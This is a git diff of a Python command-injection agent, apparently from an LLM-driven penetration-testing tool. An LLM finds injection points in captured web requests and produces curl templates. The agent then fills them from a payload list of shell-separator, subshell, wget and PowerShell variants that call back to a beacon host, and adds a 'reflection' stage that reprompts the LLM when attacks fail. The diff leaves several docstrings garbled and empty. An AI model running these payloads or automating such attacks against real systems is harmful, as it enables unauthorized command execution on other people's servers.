@@ -1,5 +1,5 @@
 """
-Command Injection Agent - 完整版（使用LLM生成注入点）
+Command Injection Agent - （LLM）
 """
 
 from typing import Dict, Any, List
@@ -16,32 +16,31 @@ from attack_agent.request_utils import extract_useful_response
 
 class CommandInjectionAgent:
     """
-    命令注入测试Agent（完整实现）
+    Agent（）
 
-    工作流程：
-    1. 调用LLM分析请求，识别命令注入点
-    2. LLM生成带{PAYLOAD}占位符的curl命令模板
-    3. 生成统一的token（用于beacon检测）
-    4. 生成命令注入payload列表（包含beacon URL + token）
-    5. 用实际payload替换{PAYLOAD}占位符
-    6. 执行测试并记录token
-    7. 用户需要检查beacon服务器是否收到请求
+    Workflow:
+    1. LLM，
+    2. LLM generates curl command templates with {PAYLOAD} placeholder
+    3. token（beacon）
+    4. payload（beacon URL + token）
+    5. payload{PAYLOAD}
+    6. token
+    7. beacon
     """
 
     def __init__(self, client,
                  prompt_path: str = "prompt/command_injection_attack.txt",
                  beacon_base: str = "http://172.17.0.1:9091/",
                  log_dir: str = "output/attack_logs/cmdi",
-                 reflection_enabled: bool = True):  # ✅ 新增：反思功能开关
+                 reflection_enabled: bool = True):
         self.client = client
         self.prompt_path = Path(prompt_path)
         self.beacon_base = beacon_base.rstrip("/") + "/"
         self.log_dir = Path(log_dir)
         self.log_dir.mkdir(parents=True, exist_ok=True)
         self._log_path = self.log_dir / "cmdi_agent.log"
-        self.reflection_enabled = reflection_enabled  # ✅ 保存配置
+        self.reflection_enabled = reflection_enabled
 
-        # ✅ 新增：记录所有执行的测试（用于延迟检测）
         self.execution_records: Dict[str, Dict[str, Any]] = {}  # {token: {url, payloads, ...}}
 
     def _log(self, *args):
@@ -53,25 +52,25 @@ class CommandInjectionAgent:
             pass
 
     def _load_prompt_template(self) -> str:
-        """加载CMDI prompt模板"""
+        """CMDI prompt"""
         return self.prompt_path.read_text(encoding="utf-8")
 
     def _generate_token(self, length: int = 16) -> str:
-        """生成随机token"""
+        """token"""
         chars = string.ascii_letters + string.digits
         return ''.join(random.choice(chars) for _ in range(length))
 
     def test(self, request: Dict[str, Any], credentials: Dict[str, Any]) -> Dict[str, Any]:
         """
-        测试单个请求的命令注入（两阶段版本）
+        （）
 
-        两阶段测试流程：
-        - Stage 1: 初始攻击（使用原始prompt）
-        - Stage 2: 反思攻击（如果Stage 1失败，基于失败分析生成新策略）
+        Two-stage test flow:
+        - Stage 1: initial attack (original prompt)
+        - Stage 2: reflection attack (if Stage 1 fails)
 
         Args:
-            request: 完整请求数据（包含response）
-            credentials: 账户凭证
+            request: full request data (including response)
+            credentials: account credentials
 
         Returns:
             {
@@ -83,24 +82,20 @@ class CommandInjectionAgent:
                 "curl_templates": List[str]
             }
         """
-        # ========== Stage 1: 初始攻击 ==========
         self._log(f"\n{'='*70}")
         self._log(f"[STAGE 1: Initial Attack]")
         self._log(f"{'='*70}\n")
 
         result_stage1 = self._execute_stage1(request, credentials)
 
-        # 如果检测到漏洞，直接返回
         if result_stage1.get("vulnerable") is True:
             self._log(f"\n[STAGE 1] ✓ VULNERABLE - Skipping Stage 2")
             return result_stage1
 
-        # 如果未启用反思，直接返回Stage 1结果
         if not self.reflection_enabled:
             self._log(f"\n[Reflection] Disabled - Returning Stage 1 result")
             return result_stage1
 
-        # ========== Stage 2: 反思攻击 ==========
         self._log(f"\n{'='*70}")
         self._log(f"[STAGE 2: Reflective Attack]")
         self._log(f"{'='*70}")
@@ -117,10 +112,10 @@ class CommandInjectionAgent:
 
     def _execute_stage1(self, request: Dict[str, Any], credentials: Dict[str, Any]) -> Dict[str, Any]:
         """
-        执行Stage 1初始攻击
+        Execute Stage 1 initial attack
 
         Returns:
-            Stage 1结果字典（包含test_results和llm_analysis用于反思）
+            Stage 1 result dict (includes test_results and llm_analysis for reflection)
         """
         method = request.get("method", "GET")
         url = request.get("url", "")
@@ -142,21 +137,20 @@ class CommandInjectionAgent:
         self._log(f"  Credentials: {json.dumps(credentials, indent=6, default=str)}")
         self._log(f"")
 
-        # ========== 第一步：调用LLM生成curl模板 ==========
         self._log(f"[Step 1: Calling LLM to Identify Injection Points]")
-        curl_templates, llm_analysis = self._generate_curl_templates(request)  # ✅ 获取LLM分析输出
+        curl_templates, llm_analysis = self._generate_curl_templates(request)
 
         if not curl_templates:
             self._log(f"[CMDI] No injection points identified by LLM")
             return {
                 "vulnerable": False,
-                "stage": 1,  # ✅ 添加stage标记
+                "stage": 1,
                 "token": None,
                 "payloads_tested": 0,
                 "beacon_url": None,
                 "curl_templates": [],
-                "test_results": [],  # ✅ 添加test_results
-                "llm_analysis": llm_analysis,  # ✅ 保存LLM分析
+                "test_results": [],
+                "llm_analysis": llm_analysis,
                 "note": "No injection points found"
             }
 
@@ -165,40 +159,32 @@ class CommandInjectionAgent:
             self._log(f"  {i}. {tmpl}")
         self._log(f"")
 
-        # ========== 第二步：生成统一的token ==========
         token = self._generate_token()
         beacon_url = f"{self.beacon_base}?data={token}"
         self._log(f"[Step 2: Generated Unified Token]: {token}")
         self._log(f"[Beacon URL]: {beacon_url}")
         self._log(f"")
 
-        # ========== 第三步：生成命令注入payload列表 ==========
         cmd_payloads = self._get_cmd_payloads(beacon_url)
         self._log(f"[Step 3: Generated {len(cmd_payloads)} Command Injection Payloads]:")
         for i, payload in enumerate(cmd_payloads, 1):
             self._log(f"  {i}. {payload}")
         self._log(f"")
 
-        # ========== 第四步：执行测试 ==========
         self._log(f"[Step 4: Executing Tests]")
         payloads_tested = 0
-        test_results: List[Dict[str, Any]] = []  # ✅ 保存测试结果用于反思
+        test_results: List[Dict[str, Any]] = []
 
         for template in curl_templates:
             self._log(f"\n[Testing Template]: {template}")
 
             for payload in cmd_payloads:
-                # 检查模板是否包含 {PAYLOAD}
                 if '{PAYLOAD}' not in template:
                     self._log(f"  ⚠️  Template missing {{PAYLOAD}} placeholder, skipping")
                     continue
 
-                # ✅ 使用新的安全执行函数
-                # - 自动判断 payload 位置并决定是否 URL 编码
-                # - 使用 shell=False 避免引号问题
                 from attack_agent.request_utils import execute_curl_safe
 
-                # 打印完整payload（不截断）
                 self._log(f"  [Payload]: {payload}")
 
                 try:
@@ -209,10 +195,8 @@ class CommandInjectionAgent:
                         timeout=15
                     )
 
-                    # ✅ 打印真正执行的完整 curl 命令
                     self._log(f"  [Command]: {final_cmd}")
 
-                    # 解析HTTP状态码
                     from attack_agent.request_utils import parse_http_status_from_response
                     http_status, response_body = parse_http_status_from_response(stdout)
 
@@ -221,17 +205,16 @@ class CommandInjectionAgent:
                     if http_status is not None:
                         self._log(f"  HTTP Status: {http_status}")
                     self._log(f"  Response length: {len(response_body)} bytes")
-                    self._log(f"  Response (extracted):\n{extracted_response}")  # ✅ 打印提取后的
+                    self._log(f"  Response (extracted):\n{extracted_response}")
                     if stderr:
                         self._log(f"  Stderr: {stderr}")
                     payloads_tested += 1
 
-                    # ✅ 保存提取后的响应
                     test_results.append({
                         "template": template,
                         "payload": payload,
                         "http_status": http_status,
-                        "response": extracted_response,  # ✅ 保存提取后的
+                        "response": extracted_response,
                         "stderr": stderr,
                         "returncode": returncode,
                         "final_command": final_cmd
@@ -239,7 +222,6 @@ class CommandInjectionAgent:
 
                 except Exception as e:
                     self._log(f"  ✗ Failed: {e}")
-                    # ✅ 保存失败结果
                     test_results.append({
                         "template": template,
                         "payload": payload,
@@ -252,7 +234,6 @@ class CommandInjectionAgent:
         self._log(f"  Unified Token: {token}")
         self._log(f"  Beacon URL: {beacon_url}")
 
-        # ✅ 检查beacon日志中是否有token
         from attack_agent.request_utils import check_beacon_detection
 
         vulnerable = check_beacon_detection(token)
@@ -261,7 +242,6 @@ class CommandInjectionAgent:
         self._log(f"  Result: {'VULNERABLE' if vulnerable else 'PENDING (waiting for finalize)'}")
         self._log(f"{'='*70}\n")
 
-        # ✅ 记录执行信息（用于延迟检测）
         self.execution_records[token] = {
             "token": token,
             "beacon_url": beacon_url,
@@ -271,27 +251,26 @@ class CommandInjectionAgent:
         }
 
         return {
-            "vulnerable": vulnerable if vulnerable else None,  # ✅ None表示pending
-            "stage": 1,  # ✅ 标记为Stage 1
+            "vulnerable": vulnerable if vulnerable else None,
+            "stage": 1,
             "token": token,
             "payloads_tested": payloads_tested,
             "beacon_url": beacon_url,
-            "curl_templates": curl_templates,  # ✅ 保存用于反思
-            "test_results": test_results,  # ✅ 保存用于反思
-            "llm_analysis": llm_analysis,  # ✅ 保存LLM分析输出
+            "curl_templates": curl_templates,
+            "test_results": test_results,
+            "llm_analysis": llm_analysis,
             "note": f"Stage 1 - Beacon detection: {'CMDI confirmed' if vulnerable else 'Pending finalize'}"
         }
 
     def _generate_curl_templates(self, request: Dict[str, Any]) -> tuple:
         """
-        调用LLM生成带{PAYLOAD}占位符的curl模板
+        Call LLM to generate curl templates with {PAYLOAD} placeholder
 
         Returns:
-            (curl模板列表, LLM完整输出) 元组
+            Returns (curl template list, full LLM output) tuple
         """
         sys_prompt = self._load_prompt_template()
 
-        # 格式化请求信息
         original_response = str(request.get('response_body', ''))
         extracted_response = extract_useful_response(original_response, max_length=2000)
         user_prompt = f"""REQUEST INFORMATION:
@@ -326,31 +305,28 @@ Please analyze this request and generate curl command templates with {{PAYLOAD}}
             self._log(f"{llm_output}")
             self._log(f"{'~'*70}\n")
 
-            # 解析Commands部分
             templates = self._parse_curl_templates(llm_output)
 
-            return templates, llm_output  # ✅ 返回元组
+            return templates, llm_output
 
         except Exception as e:
             self._log(f"[CMDI] LLM call failed: {e}")
             import traceback
             self._log(traceback.format_exc())
-            return [], ""  # ✅ 错误时返回空列表和空字符串
+            return [], ""
 
     def _parse_curl_templates(self, llm_output: str) -> List[str]:
         """
-        从LLM输出中提取curl模板（改进版，兼容多种LLM输出格式）
+        Extract curl templates from LLM output (multi-format compatible)
 
         Returns:
-            curl模板列表
+            Returns list of curl templates
         """
         templates = []
         lines = llm_output.splitlines()
 
-        # 查找 "Commands" 关键词所在行的索引
         commands_line_idx = -1
         for i, line in enumerate(lines):
-            # 简单判断：行中是否包含 "command:" (不区分大小写)
             line_lower = line.lower()
             if 'command:' in line_lower or 'commands:' in line_lower:
                 commands_line_idx = i
@@ -360,21 +336,16 @@ Please analyze this request and generate curl command templates with {{PAYLOAD}}
             self._log(f"[Warning] No Commands section found in LLM output")
             return []
 
-        # 从Commands行之后开始解析
         for i in range(commands_line_idx + 1, len(lines)):
             line = lines[i].strip()
 
-            # 跳过空行
             if not line:
                 continue
 
-            # 跳过markdown代码块标记
             if line.startswith('```'):
                 continue
 
-            # 检查是否包含 curl 关键词和 {PAYLOAD} 占位符
             if 'curl' in line and '{PAYLOAD}' in line:
-                # 清理可能的markdown格式
                 cleaned = line.lstrip('`').rstrip('`').strip()
                 templates.append(cleaned)
 
@@ -385,58 +356,49 @@ Please analyze this request and generate curl command templates with {{PAYLOAD}}
 
     def _get_cmd_payloads(self, beacon_url: str) -> List[str]:
         """
-        生成命令注入payload列表
+        payload
 
         Args:
-            beacon_url: 回调URL（包含token）
+            beacon_url: URL（token）
 
         Returns:
-            payload列表
+            payload
         """
         url_encoded = quote(beacon_url, safe=':/?=&')
 
         return [
-            # 直接分隔符
             f";curl {beacon_url}",
             f"&& curl {beacon_url}",
             f"| curl {beacon_url}",
             f"\n curl {beacon_url}",
 
-            # 子进程/命令替换
             f"$(curl {beacon_url})",
             f"`curl {beacon_url}`",
 
-            # 显式shell
             f";bash -c 'curl {beacon_url}'",
             f"&& sh -c \"curl {beacon_url}\"",
 
-            # wget兜底（有的镜像缺curl）
             f";wget -qO- {beacon_url}",
             f"&& wget --quiet --output-document=- {beacon_url}",
 
-            # URL编码变体
             f"%3Bcurl%20{url_encoded}",
             f"%26%26%20curl%20{url_encoded}",
 
-            # Windows命令（如果目标是Windows）
             f"& curl {beacon_url}",
             f"&& powershell -c \"Invoke-WebRequest {beacon_url}\"",
         ]
 
-    # ========== Stage 2: 反思攻击方法 ==========
 
     def _execute_stage2(self, request: Dict[str, Any], credentials: Dict[str, Any],
                        stage1_context: Dict[str, Any]) -> Dict[str, Any]:
         """
-        执行Stage 2反思攻击（CMDI版，纯OOB检测）
+        Stage 2（CMDI，OOB）
 
-        复用SSRF的反思逻辑
+        SSRF
         """
-        # 1. 构建反思suffix
         self._log(f"[Reflection] Building reflection analysis...")
         reflection_suffix = self._build_reflection_suffix(stage1_context)
 
-        # 2. 调用LLM生成新模板
         self._log(f"[Step 1: Generating Reflection Templates via LLM]")
         new_templates, llm_reflection_output = self._generate_curl_templates_with_reflection(
             request=request,
@@ -454,21 +416,18 @@ Please analyze this request and generate curl command templates with {{PAYLOAD}}
             self._log(f"  {i}. {tmpl}")
         self._log(f"")
 
-        # 3. 生成新的token
         token = self._generate_token()
         beacon_url = f"{self.beacon_base}?data={token}"
         self._log(f"[Step 2: Generated New Token]: {token}")
         self._log(f"[Beacon URL]: {beacon_url}")
         self._log(f"")
 
-        # 4. 生成payload列表
         cmd_payloads = self._get_cmd_payloads(beacon_url)
         self._log(f"[Step 3: Generated {len(cmd_payloads)} Command Injection Payloads]:")
         for i, payload in enumerate(cmd_payloads, 1):
             self._log(f"  {i}. {payload}")
         self._log(f"")
 
-        # 5. 执行测试
         self._log(f"[Step 4: Executing Tests]")
         payloads_tested = 0
         test_results: List[Dict[str, Any]] = []
@@ -493,7 +452,6 @@ Please analyze this request and generate curl command templates with {{PAYLOAD}}
                         timeout=15
                     )
 
-                    # ✅ 打印真正执行的完整 curl 命令
                     self._log(f"  [Command]: {final_cmd}")
 
                     from attack_agent.request_utils import parse_http_status_from_response
@@ -504,17 +462,16 @@ Please analyze this request and generate curl command templates with {{PAYLOAD}}
                     if http_status is not None:
                         self._log(f"  HTTP Status: {http_status}")
                     self._log(f"  Response length: {len(response_body)} bytes")
-                    self._log(f"  Response (extracted):\n{extracted_response}")  # ✅ 打印提取后的
+                    self._log(f"  Response (extracted):\n{extracted_response}")
                     if stderr:
                         self._log(f"  Stderr: {stderr}")
                     payloads_tested += 1
 
-                    # ✅ 保存提取后的响应
                     test_results.append({
                         "template": template,
                         "payload": payload,
                         "http_status": http_status,
-                        "response": extracted_response,  # ✅ 保存提取后的
+                        "response": extracted_response,
                         "stderr": stderr,
                         "returncode": returncode,
                         "final_command": final_cmd
@@ -528,7 +485,6 @@ Please analyze this request and generate curl command templates with {{PAYLOAD}}
                         "error": str(e)
                     })
 
-        # 6. OOB检测
         from attack_agent.request_utils import check_beacon_detection
         vulnerable = check_beacon_detection(token)
 
@@ -541,7 +497,6 @@ Please analyze this request and generate curl command templates with {{PAYLOAD}}
         self._log(f"  Result: {'VULNERABLE (detected in Stage 2)' if vulnerable else 'PENDING (waiting for finalize)'}")
         self._log(f"{'='*70}\n")
 
-        # 7. 记录执行信息
         method = request.get("method", "GET")
         url = request.get("url", "")
         self.execution_records[token] = {
@@ -559,10 +514,9 @@ Please analyze this request and generate curl command templates with {{PAYLOAD}}
             "payloads_tested": payloads_tested,
             "beacon_url": beacon_url,
             "curl_templates": new_templates,
-            "test_results": test_results,  # Stage 2的测试结果
+            "test_results": test_results,
             "llm_reflection_output": llm_reflection_output,
             "reflection_analysis": reflection_suffix,
-            # ✅ 新增：保留Stage 1的完整结果
             "stage1_results": {
                 "test_results": stage1_context.get("test_results", []),
                 "curl_templates": stage1_context.get("curl_templates", []),
@@ -574,7 +528,7 @@ Please analyze this request and generate curl command templates with {{PAYLOAD}}
 
     def _build_reflection_suffix(self, stage1_context: Dict[str, Any]) -> str:
         """
-        构建CMDI反思suffix
+        CMDIsuffix
         """
         templates = stage1_context.get("curl_templates", [])
         test_results = stage1_context.get("test_results", [])
@@ -585,24 +539,20 @@ Please analyze this request and generate curl command templates with {{PAYLOAD}}
         suffix += "STAGE 1 RESULTS (Failed Detection)\n"
         suffix += "="*70 + "\n\n"
 
-        # 1. 之前生成的模板
         suffix += "Previous Templates Generated:\n"
         for i, tmpl in enumerate(templates, 1):
             suffix += f"{i}. {tmpl}\n"
         suffix += "\n"
 
-        # 2. 执行结果摘要
         suffix += "Execution Results:\n"
         suffix += "-"*70 + "\n"
         suffix += f"Total payloads tested: {len(test_results)}\n"
         suffix += f"OOB beacon detection: FAILED (token not found)\n"
         suffix += "\n"
 
-        # 3. 结果说明
         suffix += f"Result: {'NOT VULNERABLE' if vulnerable is False else 'UNCERTAIN/PENDING'}\n"
         suffix += "\n"
 
-        # 4. 反思任务说明
         suffix += "="*70 + "\n"
         suffix += "YOUR TASK FOR STAGE 2 - REFLECTION\n"
         suffix += "="*70 + "\n\n"
@@ -650,7 +600,7 @@ Commands:
     def _generate_curl_templates_with_reflection(self, request: Dict[str, Any],
                                                  reflection_suffix: str) -> tuple:
         """
-        调用LLM生成反思后的新CMDI模板
+        LLMCMDI
         """
         sys_prompt = self._load_prompt_template()
 
@@ -667,7 +617,6 @@ Response Body (extracted): {extracted_response}
 Please analyze this request and generate curl command templates with {{PAYLOAD}} placeholder for command injection testing.
 """
 
-        # ✅ Append反思内容
         user_prompt += reflection_suffix
 
         self._log(f"\n[LLM INPUT - Reflection Prompt]:")
@@ -702,7 +651,7 @@ Please analyze this request and generate curl command templates with {{PAYLOAD}}
             return [], ""
 
     def check_final_results(self) -> Dict[str, bool]:
-        """检查最终结果（统一延迟检测）"""
+        """（）"""
         self._log(f"\n{'='*70}")
         self._log(f"[CMDI] Checking Final Results")
         self._log(f"{'='*70}\n")
@@ -712,7 +661,6 @@ Please analyze this request and generate curl command templates with {{PAYLOAD}}
         from attack_agent.request_utils import check_beacon_detection
 
         for token in self.execution_records.keys():
-            # 重新检查beacon日志
             is_vulnerable = check_beacon_detection(token)
             updates[token] = is_vulnerable
 
